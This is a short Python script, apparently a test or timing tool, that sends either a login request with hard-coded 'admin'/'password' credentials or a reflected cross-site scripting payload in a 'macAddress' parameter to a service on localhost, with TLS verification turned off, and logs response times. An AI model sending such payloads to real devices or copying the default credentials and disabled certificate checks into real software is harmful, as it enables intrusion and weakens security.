# Sends a predefined XSS/login HTTP-request to localhost.

import argparse
import ssl
import requests
import warnings
import datetime
warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made to host 'localhost'")

# Log how long a request and when
def log(file_name, time):
  f = open(file_name, "a")
  f.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ' + "\n")
  f.close()

# Login to the device
def login(url, log):
  url = url + '/login.php'
  headers = {'username' : 'admin',
    'password' : 'password',
    'id' : '123456' }

  log.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ')
  r = requests.post(url, headers=headers, verify=False)
  print('Response from the server: ' + str(r.status_code))
  print('Response time: ' + str(r.elapsed))
  log.write(str(r.elapsed) + "\n")

# Send the attack
def attack(url, log):
  payload = '?/boardData103?macAddress="><script>alert(1)</script>'

  log.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ')
  r = requests.get(url + payload, verify=False)
  print('Response from the server: ' + str(r.status_code))
  print('Response time: ' + str(r.elapsed))
  log.write(str(r.elapsed) + "\n")

# Parse url, read args, log and send the packets
def main():
  if args.https:
    url = 'https://localhost:' + str(args.port)
  else:
    url = 'http://localhost:' + str(args.port)

  log = open(args.mode + ".txt", "a")

  for x in range(args.repeats):
    if args.mode == 'xss':
      attack(url, log)
    else:
      login(url, log)

  log.close()

# Define the command line parser     
if __name__ == "__main__":
  parser = argparse.ArgumentParser(
    description='Sends a predefined XSS/login -script to localhost and records response times.')
  parser.add_argument('mode',
    type=str,
    choices=['xss', 'login'],
    help='Choses the script mode.')
  parser.add_argument('port',
    type=int, 
    help='Chooses the port: <port>')
  parser.add_argument(
    '--https',
    action='store_true',
    help='Sets HTTPS when logging in.')
  parser.add_argument('-r',
    type=int,
    default=1,
    action='store',
    dest='repeats',
    help='Repeats the request a specified number of time')

  args = parser.parse_args()

  main()
